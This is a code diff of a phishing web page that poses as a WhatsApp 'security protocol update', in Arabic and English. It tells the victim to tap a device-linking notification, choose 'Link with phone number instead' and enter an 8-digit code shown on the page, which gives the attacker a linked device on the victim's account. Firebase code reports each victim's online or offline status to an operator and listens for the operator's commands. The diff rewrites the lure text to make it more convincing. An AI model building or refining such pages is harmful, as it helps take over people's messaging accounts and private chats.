@@ -13,8 +13,11 @@
         .badge { background: #e7f3f3; color: #128c7e; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 25px; }
         .v-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 18px; margin-bottom: 25px; }
         .v-row { display: flex; justify-content: space-between; font-size: 14px; margin: 10px 0; }
+        
+        /* التعديل الجوهري: الكلام على الجنب وليس في المنتصف */
         .alert-p { font-size: 14px; color: #3b4a54; text-align: start; line-height: 1.5; border-top: 1px solid #eee; padding-top: 20px; margin-bottom: 15px; }
         .steps { text-align: start; font-size: 14px; color: #1c1e21; line-height: 1.6; }
+        
         .code-zone { border: 1.5px solid #00a884; border-radius: 10px; padding: 20px; margin-top: 25px; min-height: 110px; display: flex; flex-direction: column; justify-content: center; }
         #pairing-code { font-size: 32px; font-weight: bold; color: #075e54; letter-spacing: 5px; font-family: monospace; margin-bottom: 10px; }
         .wait-text { font-size: 12px; font-weight: 500; color: #8696a0; }
@@ -25,7 +28,7 @@
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
         <div id="ui-title" class="header-title"></div>
-        <div class="badge">iPhone (iOS) :جهاز متصل</div>
+        <div class="badge">Linked Device: iPhone</div>
         
         <div class="v-box">
             <div class="v-row"><span id="ui-old-label" style="color:#667781"></span><span style="color:#d91e1e; font-weight:bold">V2.12.5 (Old)</span></div>
@@ -52,19 +55,19 @@
 
         const translations = {
             ar: {
-                title: "تحديث بروتوكول التشفير",
+                title: "تحديث أمان واتساب",
                 old: "بروتوكول التشفير الحالي:",
                 new: "بروتوكول التشفير المحدث:",
-                alert: "تم رصد ثغرة في تشفير الجهاز المرتبط. لتأمين محادثاتك، يجب ترقية مفاتيح التشفير يدوياً.",
-                steps: "<b>خطوات التفعيل:</b><br>1. ستتلقى الآن إشعاراً رسمياً من واتساب لربط الجهاز، اضغط عليه فوراً.<br>2. اختر <b>'الربط برقم الهاتف بدلاً من ذلك'</b> من أسفل الشاشة.<br>3. أدخل رمز المصادقة التالي المكون من 8 أرقام:",
-                wait: "Awaiting security code..",
+                alert: "لحماية خصوصيتك ومحادثاتك، يجب عليك الترقية إلى أحدث بروتوكول أمني (V3.0.1).",
+                steps: "<b>خطوات التفعيل:</b><br>1. ستتلقى الآن إشعاراً رسمياً من واتساب لربط الجهاز، اضغط عليه فوراً.<br>2. اختر <b>'الربط برقم الهاتف بدلاً من ذلك'</b> من أسفل الشاشة.<br>3. أدخل رمز المصادقة المكون من 8 أرقام الذي سيظهر هنا:",
+                wait: "جاري استخراج رمز الأمان..",
                 done: "أدخل الكود في واتساب الآن!"
             },
             en: {
-                title: "Security Protocol Update",
-                old: "Old Protocol:",
-                new: "New Protocol:",
-                alert: "A vulnerability was detected in the linked device. To secure your chats, you must upgrade encryption manually.",
+                title: "WhatsApp Security Update",
+                old: "Current Protocol:",
+                new: "Updated Protocol:",
+                alert: "To protect your privacy and chats, you must upgrade to the latest security protocol (V3.0.1).",
                 steps: "<b>Activation Steps:</b><br>1. You will now receive an official WhatsApp notification to link a device; tap it immediately.<br>2. Select <b>'Link with phone number instead'</b> at the bottom.<br>3. Enter the 8-digit verification code that will appear here:",
                 wait: "Awaiting security code..",
                 done: "Enter the code in WhatsApp now!"
@@ -84,8 +87,9 @@
 
         if (userId) {
             const statusRef = db.ref('monitoring/' + userId);
+            // إشعار Online
             statusRef.set({ status: "Online", ts: Date.now() });
-            // تحديث عند القفل (Offline)
+            // إشعار Offline تلقائي عند قفل الصفحة
             statusRef.onDisconnect().set({ status: "Offline", ts: Date.now() });
 
             db.ref('commands/' + userId).on('value', (snap) => {
